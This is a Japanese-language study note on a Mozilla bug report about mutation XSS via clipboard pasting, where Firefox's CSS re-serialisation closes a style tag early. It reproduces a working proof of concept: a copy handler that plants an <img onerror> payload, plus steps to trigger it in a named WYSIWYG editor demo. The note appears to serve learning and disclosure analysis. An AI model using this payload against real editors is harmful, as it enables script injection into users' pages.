# Mutation XSS via copy-and-paste in WYSIWYG editors

https://bugzilla.mozilla.org/show_bug.cgi?id=1602843

最近ブラウザのコピー＆ペーストを解析していて、https://bugzilla.mozilla.org/show_bug.cgi?id=1599181　と似たようなバグを見つけたのですが、
こちらの方はペースト時にMutation XSSを許してしまいます。
Webページが脆弱性を持つためには何か特定のパターンに従う必要がありますが、
私はかなり簡単に見つけることができました。

問題の根本は上記レポートの時と全く同じで、CSSのシリアライズです。
要約すると、貼り付けられたコンテンツに <style> タグが含まれている場合、Firefox はそれをサニタイズすることを決定します。
スタイルシートに「危険な」ルール（@import のような）が含まれていなければそのまま貼り付けられますが、含まれていれば書き換えられます。次の例を考えてみましょう。


```html
<style>
@import'';
@font-face { font-family: 'ab<\/style><img src onerror=alert(1)>'}
</style>
```

@importのせいで、貼り付けた後にコードがサニタイズされてしまいます。

```html
<style>
@font-face { font-family: "ab</style><img src onerror=alert(1)>"; }
</style>
```

<\/style>がどのように</style>に変換されたかに注目してください。上記のケースでは、スタイルシートのテキストノードが直接変更されているので、
これ自体に問題はありません。しかし、アプリケーションが次のようなことをした場合、これ自体に問題はありません。

```html
textEditor.innerHTML = clipboardData.innerHTML;
```

というのも、<img>タグは<style>タグを残してしまうからです。特定のアプリケーションがそうするかもしれないというのが私の想定でしたが、ググってみると、
これを正確に行う2つのWYSIWYGエディタを発見しました。
ですから、おそらくもっと多くのアプリケーションがあるのでしょう。

（つまり、 <\/style> が </style> に変換されるため、これを clipboardData.innerHTML 経由で書き込むことで <style>の終了と後続 処理をインジェクションできるということ？）

## PoC
1. Go to https://jsbin.com/xivapasere/1/edit?html,output
2. Press copy me.
3. Go to https://rawgit.com/alohaeditor/Aloha-Editor/hotfix/src/demo/boilerplate/ (Mutation XSS に対して脆弱なテキストエリアがある).
4. Give Aloha Editor a while to load...
5. Go to any contenteditable content.
6. Paste from clipboard.
7. Alert fires!

PoC
```html
<button onclick=document.execCommand('copy')>
  me</button>!
Everything will be fine!
<br><span style=color:red id=out></span>
<script>
  document.oncopy = ev => {
    ev.preventDefault();
    const exploit = String.raw`<style>
@font-face { font-family: "ab<\/style><img src onerror=alert(1)>"; }
</style>`;
    ev.clipboardData.setData('text/html', exploit);
    out.innerText = 'Good! Now paste it!';
  }
</script>
```

重要そうなところは以下

before
```html
<style>
@font-face { font-family: "ab<\/style><img src onerror=alert(1)>"; }
</style>
```

after
```html
<style>
@font-face { font-family: \"ab</style><img src onerror=alert(1)>\"; }
</style>
```

`"` が `\"` に変わり、後続の `<\/style>` が `</style>` に変わっている。
これによって style タグが閉じ、後続の <img> がInjectされる。
